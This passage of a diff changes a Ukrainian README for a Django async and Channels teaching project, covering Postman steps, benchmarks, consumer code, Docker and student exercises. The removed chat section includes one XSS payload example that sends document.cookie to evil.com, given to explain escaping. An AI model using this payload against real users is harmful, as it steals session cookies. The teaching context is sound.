-> Після першого GET запиту, cookie `csrftoken` з'явиться у Cookie Jar Postman.
-
----
-
-**Крок 2:** Логін через Postman
-
-```
-POST http://127.0.0.1:8000/accounts/login/
-Content-Type: application/x-www-form-urlencoded
-Body (x-www-form-urlencoded):
-  username      alice
-  password      pass123
-  csrfmiddlewaretoken   <значення csrftoken з кроку 1>
-```
-
-Після успішного логіну:
-- Postman збереже cookie `sessionid` автоматично (через Cookie Jar)
-- Статус відповіді: 302 Redirect (до головної сторінки)
-
----
-
-**Крок 3:** GET список async нотаток
-
-```
-GET http://127.0.0.1:8001/async/notes/
-```
-
-Postman автоматично надішле cookies `sessionid` і `csrftoken` (з Cookie Jar).
-Ти побачиш HTML-сторінку зі списком нотаток.
-
----
-
-**Крок 4:** POST створення нотатки через async view
-
-```
-POST http://127.0.0.1:8001/async/notes/create/
-Content-Type: application/x-www-form-urlencoded
-Headers:
-  X-CSRFToken    <значення csrftoken>
-Body (x-www-form-urlencoded):
-  title         Тестова нотатка через Postman
-  content       Зміст нотатки
-  priority      1
-Body:
-  title=Тестова нотатка через Postman
-  content=Зміст
-  priority=1
-```
-
----
-
-## 14. Benchmark: що можна і чого не можна міряти
-
-### Чого НЕ можна очікувати
-
-```bash
-# ❌ Один запит — нічого не доводить
-curl http://127.0.0.1:8000/notes/        # Sync: 45ms
-curl http://127.0.0.1:8001/async/notes/  # Async: 48ms
-# "Async повільніший!" — ХИБНИЙ висновок
-```
-
-Async має overhead від event loop. Для одного запиту — sync може бути швидшим.
-
-### Що дійсно показує різницю
-
-Різниця видна при **конкурентному навантаженні** (50+ одночасних запитів):
-
-```bash
-# 1000 запитів, 50 одночасних (потребує apache-httpd або apache2-utils)
-ab -n 1000 -c 50 http://127.0.0.1:8000/notes/         # sync
-ab -n 1000 -c 50 http://127.0.0.1:8001/async/notes/   # async
-```
-
-> **Увага:** SQLite не є ідеальною БД для async performance benchmark.
-> SQLite має глобальне блокування запису. Для реального async benchmark
-> використовуй PostgreSQL з пулом з'єднань.
-
-### Locust для навчального benchmark
-
-```bash
-pip install locust
-```
-
-Створи `locustfile.py` поруч з `manage.py`:
-
-```python
-from locust import HttpUser, task, between
-
-class SyncUser(HttpUser):
-    host = "http://127.0.0.1:8000"
-    wait_time = between(0.1, 0.5)
-
-    @task
-    def view_notes(self):
-        self.client.get("/notes/")
-
-
-class AsyncUser(HttpUser):
-    host = "http://127.0.0.1:8001"
-    wait_time = between(0.1, 0.5)
-
-    @task
-    def view_async_notes(self):
-        self.client.get("/async/notes/")
-```
-
-```bash
-locust -f locustfile.py
-# Відкрий http://localhost:8089 і запусти тест
-```
-
----
-
-## 15. Типові помилки студентів
-
-### ❌ Помилка 1: Sync ORM у async view
-
-```python
-async def bad_note_detail(request, pk):
-    note = Note.objects.get(pk=pk)  # ← SynchronousOnlyOperation!
-    return render(request, 'note_detail.html', {'note': note})
-```
-
-**Помилка:** `.get()` — sync SQL. В async context Django кидає виняток.
-
-```python
-# ✅ Правильно
-async def good_note_detail(request, pk):
-    note = await Note.objects.aget(pk=pk)  # async аналог .get()
-    return render(request, 'note_detail.html', {'note': note})
-```
-
----
-
-### ❌ Помилка 2: requests.get() в async view
-
-```python
-import requests
-
-async def bad_view(request):
-    # requests.get() — sync! Блокує весь event loop на час очікування відповіді
-    data = requests.get("https://api.example.com/data").json()
-    return JsonResponse(data)
-```
-
-**Помилка:** Весь сервер "завмирає" на час HTTP-запиту для всіх інших користувачів.
-
-```python
-# ✅ Правильно: httpx.AsyncClient
-import httpx
-
-async def good_view(request):
-    async with httpx.AsyncClient() as client:
-        # await: view призупиняється, event loop обслуговує інших
-        response = await client.get("https://api.example.com/data")
-    return JsonResponse(response.json())
-```
-
----
-
-### ❌ Помилка 3: time.sleep() в async view
-
-```python
-import time
-
-async def bad_delay_view(request):
-    time.sleep(2)  # Блокує весь event loop на 2 секунди!
-    return HttpResponse("done")
-```
-
-```python
-# ✅ Правильно: asyncio.sleep()
-import asyncio
-
-async def good_delay_view(request):
-    await asyncio.sleep(2)  # Передає управління event loop'у
-    return HttpResponse("done")
-```
-
----
-
-### ❌ Помилка 4: Переписати весь проєкт в async "бо модно"
-
-```python
-# ❌ Async тут не потрібен — зайвий overhead
-async def simple_crud_view(request):
-    note = await Note.objects.aget(pk=1)
-    return render(request, 'note.html', {'note': note})
-
-# ✅ Простіший і достатній для звичайного CRUD
-def simple_crud_view(request):
-    note = get_object_or_404(Note, pk=1)
-    return render(request, 'note.html', {'note': note})
-```
-
----
-
-## 16. Практичні завдання для студентів
-
-### Завдання 1: Порівняй код
-
-Відкрий поруч `views.py:note_list()` і `async_views.py:async_note_list()`.
-Знайди всі рядки що змінились. Запиши їх у таблицю:
-
-| Sync рядок | Async рядок | Чому змінено |
-|-----------|-------------|-------------|
-| `def note_list(request):` | `async def async_note_list(request):` | async def |
-| `@login_required` | `if not request.user.is_authenticated:` | inline auth |
-| `for note in notes_qs` | `[note async for note in notes_qs]` | async iteration |
-| ... | ... | ... |
-
-### Завдання 2: Додай async_get_pinned_notes
-
-У `selectors.py` є `get_pinned_notes(user, limit=5)`.
-Додай її async-аналог `async_get_pinned_notes(user, limit=5)` в `async_selectors.py`.
-
-Питання: ця функція має бути `def` або `async def`? Чому?
-
-### Завдання 3: Порівняй результати в браузері
-
-1. Запусти обидва сервери
-2. Створи нотатку через `/notes/new/`
-3. Перевір що вона видна через `/async/notes/`
-4. Видали нотатку через `/async/notes/<pk>/delete/`
-5. Перевір що вона зникла через `/notes/`
-
-### Завдання 4: Написати async тест
-
-У `test_async_views.py` додай тест, що перевіряє:
-- POST на `/async/notes/create/` без `title` → 200 (форма з помилками)
-- POST на `/async/notes/create/` з `title` → 302 (redirect)
-
-### Завдання 5: Зрозумій sync_to_async
-
-В `async_services.py` знайди:
-
-```python
-async_create_note = sync_to_async(create_note, thread_sensitive=True)
-```
-
-Відповідь на питання:
-1. Чому `create_note` не можна зробити native async (без sync_to_async)?
-2. Що означає `thread_sensitive=True`?
-3. Що відбувається з event loop поки sync_to_async виконується?
-
----
-
-## 17. Підсумок + документація
-
-### Що ми зробили
-
-| Крок | Файл | Результат |
-|------|------|-----------|
-| 1 | `requirements.txt` | Додали uvicorn, httpx |
-| 2 | `settings.py` | Коментарі про ASGI, CONN_MAX_AGE=0 |
-| 3 | `asgi.py` | Навчальні коментарі про uvicorn команду |
-| 4 | `async_selectors.py` | Lazy QuerySets + aget() |
-| 5 | `async_services.py` | sync_to_async + adelete + aupdate + F() |
-| 6 | `async_views.py` | 5 async def views з детальними коментарями |
-| 7 | `urls.py` | `/async/notes/` URL prefix |
-| 8 | `tests/test_async_views.py` | AsyncClient тести, sync vs async порівняння |
-
-### Офіційна документація
-
-| Тема | Посилання |
-|------|-----------|
-| Django async views | https://docs.djangoproject.com/en/5.2/topics/async/ |
-| Django async ORM | https://docs.djangoproject.com/en/5.2/ref/models/querysets/#async-queries |
-| sync_to_async | https://docs.djangoproject.com/en/5.2/topics/async/#asgiref-sync |
-| Django async testing | https://docs.djangoproject.com/en/5.2/topics/testing/tools/#asynchronous-tests |
-| Uvicorn | https://uvicorn.dev/|
-| httpx | https://www.python-httpx.org/ |
-| asgiref | https://github.com/django/asgiref |
-| asyncio (Python docs) | https://docs.python.org/3/library/asyncio.html |
-
-### Фінальна думка
-
-> **Async Django — це інструмент, а не стиль написання коду.**
->
-> Sync Django підходить для більшості проєктів: CRUD, admin, блог, API.
-> Async Django виправданий коли є **реальний I/O bottleneck**:
-> паралельні зовнішні API-запити, WebSockets, streaming, high concurrency.
->
-> Цей навчальний проєкт показує: один і той самий результат,
-> дві різних архітектури. Вибирай відповідно до задачі.
-
----
-
-## 18. Real-time груповий чат: чому тут async — єдиний правильний вибір
-
-### 18.1. Проблема: чому HTTP не підходить для чату
-
-HTTP — це протокол "запит → відповідь → закрито".
-Кожен запит браузера відкриває нове TCP-з'єднання, сервер відповідає і закриває його.
-
-```
-HTTP flow (класичний):
-  Browser ── GET /groups/7/chat/ ──► Django view → HttpResponse → [з'єднання закрите]
-  Browser ── GET /groups/7/chat/ ──► Django view → HttpResponse → [з'єднання закрите]
-  ...
-```
-
-**Проблема для чату:** сервер не може ПЕРШИМ надіслати повідомлення браузеру.
-Якщо Оля пише "Привіт" — браузер Віктора дізнається про це лише при наступному
-запиті. Коли зробити наступний запит? Не знаємо.
-
-Два "костильних" вирішення через HTTP — і чому вони погані:
-
-| Підхід | Як працює | Проблема |
-|--------|-----------|----------|
-| **Polling** | Браузер запитує `/new-messages/` кожні 2 секунди | 1000 юзерів = 500 запитів/сек. Повідомлення приходить із затримкою до 2 сек |
-| **Long polling** | Браузер надсилає запит, сервер "тримає" його відкритим до появи нового повідомлення | 1000 юзерів = 1000 заблокованих потоків на сервері |
-
-**Long polling + sync Django = катастрофа concurrency:**
-
-```
-Sync Django: один потік = один активний запит
-1000 юзерів у чаті → 1000 потоків заблоковані (чекають нових повідомлень)
-Django thread pool вичерпаний → решта сайту не відповідає
-```
-
----
-
-### 18.2. Рішення: WebSocket
-
-WebSocket — це **постійне двостороннє TCP-з'єднання** між браузером і сервером.
-Встановлюється через HTTP Upgrade handshake (один раз), після чого HTTP більше не потрібен.
-
-```
-WebSocket flow:
-  Browser ══════════ PERSISTENT TCP CONNECTION ═════════ Server
-  ↑ Будь-яка сторона може надіслати дані в будь-який момент
-  ↑ Одне з'єднання живе весь час поки відкрита вкладка
-
-  Оля:    ws.send({content: "Привіт!"})  ──────────────► consumer.receive()
-  Сервер: consumer.send({author: "Оля"}) ──────────────► ws.onmessage (у браузері Віктора)
-  Сервер: consumer.send({author: "Оля"}) ──────────────► ws.onmessage (у браузері Маші)
-```
-
-Браузерний WebSocket API — вбудований, без бібліотек:
-
-```javascript
-// Відкрити з'єднання
-const ws = new WebSocket('ws://127.0.0.1:8001/ws/groups/7/chat/')
-//                        ↑ ws:// для HTTP, wss:// для HTTPS
-
-ws.onopen    = () => { /* з'єднання встановлено */ }
-ws.onmessage = (e) => { const data = JSON.parse(e.data) }  // сервер надіслав
-ws.onclose   = (e) => { /* код закриття: 1000=норм, 1006=аварія */ }
-
-ws.send(JSON.stringify({ content: "Привіт!" }))  // надіслати на сервер
-```
-
----
-
-### 18.3. Чому WebSocket + sync Django не поєднуються
-
-Sync view в Django: обробив запит → повернув відповідь → **потік вільний**.
-WebSocket з'єднання: відкрилось → **тримається відкритим годинами**.
-
-```
-Sync Django + WebSocket:
-  1000 юзерів у чаті → 1000 потоків заблоковані до закриття вкладок
-  Thread pool вичерпаний → решта сайту не відповідає
-
-  Рішення через більше потоків? 1000 OS-потоків ≈ 8 GB RAM тільки на stack
-  Це не масштабується.
-```
-
-**Async + WebSocket — правильна архітектура:**
-
-```
-Async Django Channels:
-  1000 юзерів у чаті → 1000 Consumer об'єктів в пам'яті
-  Кожен Consumer — coroutine, "спить" поки немає повідомлень
-  Event loop обслуговує активні з'єднання (де є повідомлення)
-  CPU зайнятий тільки коли є що обробляти
-
-  1000 відкритих з'єднань ≈ RAM для 1000 Python об'єктів (кілька MB)
-```
-
-Це і є ключова різниця між sync та async для long-lived з'єднань:
-
-| | Sync | Async |
-|--|------|-------|
-| Модель | Один потік = одне з'єднання | Один event loop = тисячі coroutines |
-| 1000 юзерів | 1000 OS-потоків (~8 GB RAM на stack) | 1000 coroutines (кілька MB) |
-| CPU поки немає повідомлень | Потік заблокований (чекає) | Event loop обслуговує інших |
-| Масштабованість | Обмежена thread pool | Обмежена лише RAM і channel layer |
-
----
-
-### 18.4. Архітектура: як Django Channels вписується в Django
-
-Django Channels — пакет що додає WebSocket підтримку до Django через ASGI.
-
-```mermaid
-flowchart TD
-    Browser["Браузер"]
-    Uvicorn["Uvicorn ASGI :8001"]
-    PTR["ProtocolTypeRouter\nasgi.py"]
-    Auth["AuthMiddlewareStack\n(читає session cookie → User)"]
-    WS_Router["WebSocket URLRouter\nrouting.py"]
-    Consumer["GroupChatConsumer\nconsumers.py"]
-    DjangoHTTP["Django HTTP\n(звичайні views)"]
-    ChannelLayer["InMemoryChannelLayer\n(pub/sub in-process)"]
-    DB[("SQLite DB")]
-
-    Browser -->|"HTTP GET /notes/"| Uvicorn
-    Browser -->|"WS ws://…/ws/groups/7/chat/"| Uvicorn
-    Uvicorn --> PTR
-    PTR -->|"protocol=http"| DjangoHTTP
-    PTR -->|"protocol=websocket"| Auth
-    Auth --> WS_Router
-    WS_Router --> Consumer
-    Consumer <-->|"group_add / group_send / group_discard"| ChannelLayer
-    ChannelLayer -->|"chat_message()"| Consumer
-    Consumer -->|"database_sync_to_async"| DB
-```
-
-Ключові компоненти:
-
-| Компонент | Роль | Аналог в HTTP Django |
-|-----------|------|---------------------|
-| `ProtocolTypeRouter` | Розрізняє HTTP і WebSocket і направляє | `ROOT_URLCONF` |
-| `AuthMiddlewareStack` | Читає session cookie, завантажує `User` в `scope` | `@login_required` |
-| `WebSocket URLRouter` | Маршрутизує WebSocket URL до Consumer | `urls.py` |
-| `Consumer` | Обробляє WebSocket-з'єднання весь час | `view` |
-| `InMemoryChannelLayer` | Pub/sub: доставляє повідомлення всім Consumer одної групи | _(немає аналога)_ |
-
----
-
-### 18.5. Consumer: lifecycle та методи
-
-Відкрий файл: `hello_app/consumers.py`
-
-Consumer — це клас що успадковує `AsyncWebsocketConsumer`.
-На відміну від view (один запит → одна відповідь), Consumer **живе весь час** з'єднання.
-
-```
-Consumer lifecycle:
-  1. connect()      ← браузер відкрив з'єднання (один раз)
-  2. receive()      ← браузер надіслав повідомлення (N разів)
-     receive()      ← ...
-     receive()      ← ...
-  3. chat_message() ← channel layer доставив broadcast від іншого consumer (N разів)
-     chat_message() ← ...
-  4. disconnect()   ← браузер закрив з'єднання (один раз)
-```
-
-#### connect(): що відбувається при відкритті з'єднання
-
-```python
-async def connect(self):
-    # 1. Читаємо user — AuthMiddlewareStack вже завантажив його в scope
-    self.user = self.scope['user']
-
-    # 2. Відхиляємо незалогінених (await close() → WS close frame браузеру)
-    if not self.user.is_authenticated:
-        await self.close(); return
-
-    # 3. Читаємо group_pk з URL (аналог kwargs у view)
-    self.group_pk = int(self.scope['url_route']['kwargs']['group_pk'])
-
-    # 4. Перевіряємо членство в групі (database_sync_to_async → ORM у потоці)
-    if not await self.check_membership(self.group_pk, self.user):
-        await self.close(); return
-
-    # 5. Підписуємось на "broadcasting group" у channel layer
-    self.room_group_name = f"chat_group_{self.group_pk}"
-    await self.channel_layer.group_add(self.room_group_name, self.channel_name)
-    #                                                         ↑ унікальний ID цього consumer
-
-    # 6. Приймаємо з'єднання (без accept() → браузер отримає 403)
-    await self.accept()
-
-    # 7. Надсилаємо останні 50 повідомлень з БД (history)
-    for msg in await self.load_history(self.group_pk):
-        await self.send(text_data=json.dumps({'type': 'history', ...}))
-```
-
-#### receive(): нове повідомлення від браузера
-
-```python
-async def receive(self, text_data):
-    data = json.loads(text_data)         # JS: socket.send(JSON.stringify({content: "Hi"}))
-    content = data.get('content', '').strip()
-
-    # Зберігаємо в БД
-    msg = await self.save_message(self.group_pk, self.user, content)
-
-    # Broadcast ВСІМ підписникам групи через channel layer
-    await self.channel_layer.group_send(
-        self.room_group_name,
-        {
-            'type': 'chat_message',   # → Django Channels викличе метод chat_message()
-            'author': self.user.username,
-            'content': content,
-            'timestamp': msg.timestamp.isoformat(),
-        }
-    )
-```
-
-#### chat_message(): отримали broadcast від channel layer
-
-```python
-async def chat_message(self, event):
-    # event['type'] = 'chat_message' → цей метод
-    # Задача: переслати JSON НАШОМУ браузеру
-    await self.send(text_data=json.dumps({
-        'type': 'message',
-        'author': event['author'],
-        'content': event['content'],
-        'timestamp': event['timestamp'],
-    }))
-```
-
-**Важлива деталь:** `type: 'chat_message'` у `group_send()` → Django Channels
-автоматично шукає метод `chat_message()` у Consumer. Крапка в типі → підкреслення
-(напр. `'type': 'chat.message'` → метод `chat_message()`).
-
----
-
-### 18.6. Як channel layer доставляє повідомлення всім учасникам
-
-`InMemoryChannelLayer` реалізує pub/sub (publish/subscribe) патерн.
-
-```
-Стан channel layer коли 3 юзери відкрили чат групи 7:
-
-  channel_name Віктора: "specific.abc123"
-  channel_name Олі:     "specific.def456"
-  channel_name Маші:    "specific.ghi789"
-
-  group "chat_group_7" → підписники: ["specific.abc123", "specific.def456", "specific.ghi789"]
-
-Оля надсилає "Привіт":
-  consumer Олі: group_send("chat_group_7", {type: "chat_message", content: "Привіт"})
-                    │
-                    ├── channel layer знаходить усіх підписників chat_group_7
-                    │
-                    ├── доставляє event у consumer Віктора → chat_message() → send("Привіт")
-                    ├── доставляє event у consumer Олі    → chat_message() → send("Привіт")
-                    └── доставляє event у consumer Маші   → chat_message() → send("Привіт")
-
-Результат: "Привіт" з'являється одночасно у всіх трьох браузерах.
-```
-
-`InMemoryChannelLayer` — in-process, для одного сервера. Для production
-з кількома серверами використовують `channels-redis` (channel layer через Redis),
-але для навчального проєкту InMemory достатній.
-
----
-
-### 18.7. database_sync_to_async: чому ORM потребує обгортки в Consumer
-
-Django ORM — синхронний. Він не може виконуватись напряму в asyncio event loop.
-
-```python
-# ❌ НЕПРАВИЛЬНО — SynchronousOnlyOperation виняток
-async def connect(self):
-    group = Group.objects.get(pk=self.group_pk)   # sync ORM в async context!
-```
-
-```python
-# ✅ ПРАВИЛЬНО — database_sync_to_async
-@database_sync_to_async
-def check_membership(self, group_pk, user):
-    # Ця функція — звичайна sync def
-    # database_sync_to_async запускає її у Django thread pool (worker thread)
-    # event loop вільний поки thread виконує SQL
-    return Group.objects.get(pk=group_pk).user_set.filter(pk=user.pk).exists()
-
-async def connect(self):
-    is_member = await self.check_membership(self.group_pk, self.user)
-    #           ↑ await: view призупиняється, event loop обслуговує інших
-```
-
-**Критична деталь у `load_history`:** повертаємо `list`, а не `QuerySet`:
-
-```python
-@database_sync_to_async
-def load_history(self, group_pk):
-    qs = ChatMessage.objects.filter(group_id=group_pk).order_by('-timestamp')[:50]
-    return list(qs.values('id', 'author__username', 'content', 'timestamp'))
-    #      ↑ list() виконує SQL ТУТ, у worker thread
-    #      QuerySet — lazy, прив'язаний до thread де створений
-    #      Якщо повернути QuerySet і ітерувати в async context → помилка
-```
-
-| Wrapper | Коли використовувати | В цьому проєкті |
-|---------|---------------------|-----------------|
-| `database_sync_to_async` | Django ORM (оптимізований для Django DB connections) | `check_membership`, `load_history`, `save_message` |
-| `sync_to_async` | Будь-який sync код без DB | _(у async_services.py для `create_note`)_ |
-
----
-
-### 18.8. Vanilla JS WebSocket клієнт
-
-Відкрий файл: `hello_app/static/hello_app/js/group_chat.js`
-
-JS клієнт керує станом з'єднання і відображенням повідомлень.
-
-```
-Стан з'єднання (status bar у UI):
-  connecting → connected → (якщо аварія) disconnected → (авторепідключення) connecting → ...
-
-  1000 = нормальне закриття  → НЕ перепідключатись
-  1001 = сторінка закривається → НЕ перепідключатись
-  1006 = аварія (інтернет, сервер впав) → перепідключитись через 3 секунди
-```
-
-Два типи повідомлень від сервера:
-
-| `type` | Коли | Від чого | Що відображається |
-|--------|------|----------|-------------------|
-| `history` | Одразу після connect() | `load_history()` у consumer | Останні 50 повідомлень з БД |
-| `message` | Real-time | `chat_message()` у consumer | Нове повідомлення від будь-кого |
-
-**XSS захист — обов'язковий для чату:**
-
-```javascript
-// ❌ НЕБЕЗПЕЧНО: user content напряму в innerHTML
-div.innerHTML = data.content  // зловмисник надсилає <script>...</script> → XSS
-
-// ✅ ПРАВИЛЬНО: escapeHtml() перед будь-яким user content
-wrapper.innerHTML = `<div class="chat-content">${escapeHtml(data.content)}</div>`
-// escapeHtml замінює: & → &amp;  < → &lt;  > → &gt;  " → &quot;  ' → &#039;
-```
-
-Без `escapeHtml()` зловмисник може надіслати повідомлення:
-```html
-<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
-```
-і отримати cookies всіх учасників чату (Session Hijacking).
-
----
-
-### 18.9. Повний flow: від натискання Enter до появи повідомлення у всіх
-
-```mermaid
-sequenceDiagram
-    participant Viktor_JS as Браузер Віктора (JS)
-    participant Viktor_WS as Consumer Віктора
-    participant ChannelLayer as InMemoryChannelLayer
-    participant Olya_WS as Consumer Олі
-    participant Olya_JS as Браузер Олі (JS)
-    participant DB as SQLite
-
-    Viktor_JS->>Viktor_WS: ws.send({content: "Привіт!"})
-    Viktor_WS->>DB: save_message() через database_sync_to_async
-    DB-->>Viktor_WS: ChatMessage(id=42, timestamp=...)
-    Viktor_WS->>ChannelLayer: group_send("chat_group_7", {type:"chat_message", ...})
-    par channel layer broadcast
-        ChannelLayer->>Viktor_WS: chat_message(event)
-        ChannelLayer->>Olya_WS: chat_message(event)
-    end
-    Viktor_WS->>Viktor_JS: ws.onmessage({type:"message", author:"Viktor", ...})
-    Olya_WS->>Olya_JS: ws.onmessage({type:"message", author:"Viktor", ...})
-    Note over Viktor_JS,Olya_JS: "Привіт!" з'являється одночасно в обох браузерах
-```
-
-Весь цей шлях — **без жодного HTTP запиту**. Тільки WebSocket frames.
-
----
-
-### 18.10. Запуск та тестування чату
-
-**Крок 1:** Запусти ASGI-сервер (чат вимагає ASGI, не runserver):
+Запустити:
 
 ```bash
 uvicorn notes_project.asgi:application --reload --port 8001
 ```
 
-**Крок 2:** Відкрий http://127.0.0.1:8001/ і залогінься.
+Контрольна перевірка: пояснити, чому WebSocket Consumer живе довше, ніж HTTP view.
 
-**Крок 3:** Перейди до будь-якої групи (http://127.0.0.1:8001/groups/) і натисни «Відкрити чат».
+### Рівень 8. Production thinking
 
-**Крок 4:** Відкрий той самий URL у другій вкладці (або іншому браузері) під іншим користувачем.
+Прочитати:
 
-**Крок 5:** Надішли повідомлення — воно з'явиться в обох вкладках **миттєво** без перезавантаження.
+- `Dockerfile`;
+- `docker-compose.yml`;
+- `entrypoint.sh`;
+- `.env.example`;
+- production checklist у цьому README.
 
-> **Щоб побачити різницю:** спробуй уявити той самий чат через polling (GET кожні 2 сек).
-> Відкрий Network tab у DevTools: при WebSocket — один рядок (WS-з'єднання).
-> При polling — новий рядок кожні 2 секунди, навіть коли ніхто нічого не пише.
+Контрольна перевірка: пояснити, чому `DEBUG=True` і hardcoded `SECRET_KEY` не підходять для production.
 
----
+## 31. Практичні завдання
 
-### 18.11. Підсумок: чому чат — ідеальна демонстрація async
+### Базові
 
-Async views у цьому проєкті (розділи 04–12) показують **як** писати async код.
-Технічно той самий результат можна отримати sync.
+- Додати нове поле до `Note`, створити migration і показати його у template.
+- Додати новий filter у `note_list`.
+- Додати новий color default для notebooks.
+- Зареєструвати `ChatMessage` у Django admin.
+- Додати template test для empty notes state.
 
-Груповий чат показує **навіщо** async існує — тут sync **архітектурно неможливий**:
+Критерій виконання: є migration, `manage.py check` проходить, behavior видно в UI.
 
-| Вимога чату | Sync Django | Async Django Channels |
-|------------|-------------|----------------------|
-| Сервер надсилає дані без запиту від браузера | ❌ Неможливо | ✅ `consumer.send()` |
-| З'єднання відкрите годинами | ❌ Блокує потік | ✅ Coroutine "спить" |
-| 1000 юзерів одночасно | ❌ Потребує 1000 потоків | ✅ 1000 легких coroutines |
-| Broadcast одного повідомлення всім | ❌ Немає механізму | ✅ `channel_layer.group_send()` |
+### Середні
 
-Це не "async краще" — це "для long-lived з'єднань sync **не підходить архітектурно**".
-Тому груповий чат і є найкращою демонстрацією: не стилістична перевага, а **необхідність**.
+- Додати selector для archived notes.
+- Додати service для archive/unarchive note і підключити view.
+- Додати test на заборону редагування чужої group note.
+- Додати pagination до `note_list`.
+- Додати search для shopping lists.
 
----
+Критерій виконання: logic у selectors/services, views лишаються тонкими, tests покривають permission rules.
 
-## 19. Docker Compose: ізольований запуск (рекомендовано)
+### Просунуті
 
-### 19.1. Навіщо Docker для цього проєкту
+- Відновити або прибрати async HTTP demo так, щоб `manage.py check` проходив.
+- Виправити Docker build context і перевірити `docker compose up --build`.
+- Перенести `SECRET_KEY`, `DEBUG`, `ALLOWED_HOSTS` в environment.
+- Додати Redis-backed Channels local scenario.
+- Додати WebSocket notification для reminders.
+- Додати coverage threshold у CI.
 
-Без Docker, Python додає всі пакети з `.venv` до `sys.path`. Якщо в одному workspace
-є кілька Django-проєктів з однаковими іменами пакетів (`notes_project`, `notes_app`) —
-Python може завантажити **не той проєкт**. Docker вирішує це раз і назавжди:
-контейнер має лише `/app` у `sys.path`, жодних сторонніх пакетів.
+Критерій виконання: documented command запускається у чистому clone, CI проходить, production gaps явно зменшені.
 
-```
-Без Docker:                         З Docker:
-sys.path = [                        sys.path = [
-  lesson_Django_authentication/..., ← /app ← тільки notes_chat_app
-  lesson_Django_Async/...,          ]
-  ...                               WORKDIR /app → ENV PYTHONPATH=/app
-]
-```
+## 32. Словник термінів
 
-### 19.2. Структура Docker Compose
+| Термін | Пояснення |
+| --- | --- |
+| framework | набір правил і інструментів для побудови застосунку |
+| repository | Git-сховище з історією коду |
+| project | Django package з settings, urls, asgi/wsgi |
+| app | Django module з models, views, forms, templates |
+| request | вхідний HTTP-запит від browser/client |
+| response | відповідь server на request |
+| route | URL rule, який направляє request |
+| view | Python-функція або клас, що обробляє request |
+| model | Python-клас, що описує database table |
+| ORM | шар Django для роботи з DB через Python objects |
+| migration | версійний опис зміни database schema |
+| template | HTML-файл з Django template language |
+| form | object для validation і rendering input fields |
+| middleware | шар між request і view або між view і response |
+| session | server-side state, прив'язаний до browser cookie |
+| authentication | перевірка, хто user |
+| authorization | перевірка, що user може робити |
+| selector | функція для читання даних з DB |
+| service | функція для зміни даних і business operation |
+| transaction | група DB operations, яка проходить повністю або відкочується |
+| WSGI | класичний sync Python web interface |
+| ASGI | async-capable Python web interface |
+| coroutine | async function execution object |
+| WebSocket | довге двостороннє connection між browser і server |
+| Consumer | Channels-клас, аналог view для WebSocket |
+| channel layer | pub/sub шар для передачі messages між Consumers |
+| CI | автоматична перевірка коду у GitHub Actions |
+| deployment | запуск застосунку на сервері для users |
 
-```yaml
-# docker-compose.yml
-services:
-  web:       ← Django + Uvicorn (порт 8001)
-  selenium:  ← Selenium Grid + Chrome (порт 4444, для E2E тестів)
-```
+## 33. Куди рухатись далі
 
-| Сервіс | Image | Роль |
-|--------|-------|------|
-| `web` | Dockerfile (python:3.12-slim) | Django ASGI сервер |
-| `selenium` | `selenium/standalone-chrome` | Headless Chrome для E2E тестів |
+Найближчі корисні кроки для репозиторію:
 
-### 19.3. Запуск
+1. Встановити dependencies у чистому venv і запустити `python manage.py check`.
+2. Вирішити async routes mismatch: відновити async modules або прибрати async URLs.
+3. Запустити unit/integration tests.
+4. Виправити Docker build context.
+5. Винести production-sensitive settings в environment.
+6. Оновити CI workflow comments так, щоб вони вели на поточний repo.
+7. Додати короткий `CONTRIBUTING.md`, якщо проєкт використовуватиметься студентами групи.
 
-```powershell
-# Перейти до папки проєкту (PowerShell / CMD)
-cd C:\Users\victo\PycharmProjects\PY-Course-Victor-Nikoriak-23_02\module_5\lesson_Django_Async\notes_chat_app
-
-# Білд + старт (перший раз ~3-5 хв)
-docker compose up --build
-
-# Або у фоні
-docker compose up --build -d
-```
-
-При першому старті `entrypoint.sh` автоматично виконує:
-1. `python manage.py migrate` — застосовує всі міграції
-2. `python manage.py collectstatic --noinput` — збирає статичні файли
-3. Запускає `uvicorn` на порту `8001`
-
-### 19.4. Корисні команди
-
-```powershell
-# Переглянути логи
-docker compose logs -f web
-
-# Відкрити shell всередині контейнера
-docker compose exec web bash
-
-# Запустити будь-яку Django команду
-docker compose exec web python manage.py shell
-docker compose exec web python manage.py createsuperuser
-docker compose exec web python manage.py migrate
-
-# Зупинити
-docker compose down
-
-# Зупинити і видалити томи (скинути БД)
-docker compose down -v
-```
-
-### 19.5. Тести в Docker
-
-```powershell
-# Всі тести (146 unit/integration + 13 Selenium E2E через Remote Chrome)
-docker compose exec web python manage.py test --verbosity=2
-
-# Тільки unit тести (без Selenium)
-docker compose exec web python manage.py test notes_app.tests.test_views notes_app.tests.test_async_views notes_app.tests.test_consumers -v 2
-
-# Тільки Selenium (вимагає selenium сервіс запущеним)
-docker compose exec web python manage.py test notes_app.tests.test_selenium -v 2
-
-# Тільки WebSocket consumer тести
-docker compose exec web python manage.py test notes_app.tests.test_consumers -v 2
-```
-
-**Як Selenium E2E тести працюють у Docker:**
-
-```
-web container              selenium container
-───────────────            ──────────────────
-LiveServerTestCase         selenium/standalone-chrome
-  binds 0.0.0.0:PORT  ←── Chrome відкриває http://web:PORT/...
-  (усі інтерфейси)         (Docker internal network)
-
-env: WEB_HOST=web          ← _DockerLiveServerMixin підставляє в live_server_url
-env: SELENIUM_REMOTE_URL=http://selenium:4444/wd/hub  ← Remote WebDriver
-```
-
-`_DockerLiveServerMixin` у `test_selenium.py` автоматично:
-- Bind-ить test server на `0.0.0.0` (доступний з selenium container)
-- Замінює `0.0.0.0` на `web` у `live_server_url` якщо `WEB_HOST` встановлено
-
-### 19.6. Нові файли Docker
-
-| Файл | Роль |
-|------|------|
-| `Dockerfile` | Образ: python:3.12-slim + встановлення пакетів |
-| `docker-compose.yml` | Сервіси: web + selenium |
-| `entrypoint.sh` | migrate → collectstatic → uvicorn при старті |
-| `.dockerignore` | Виключає .venv, __pycache__, staticfiles, db.sqlite3 |
-
-```dockerfile
-# Dockerfile — ключові рядки
-FROM python:3.12-slim
-WORKDIR /app
-ENV PYTHONPATH=/app DJANGO_SETTINGS_MODULE=notes_project.settings
-RUN pip install -r requirements.txt
-CMD ["./entrypoint.sh"]
-```
-
-```sh
-# entrypoint.sh — запускається при кожному docker compose up
-python manage.py migrate --noinput
-python manage.py collectstatic --noinput
-exec python -m uvicorn notes_project.asgi:application --host 0.0.0.0 --port 8001 --reload
-```
-
-### 19.7. Доступні URL після docker compose up
-
-| URL | Що це |
-|-----|-------|
-| http://localhost:8001/ | Django (dashboard) |
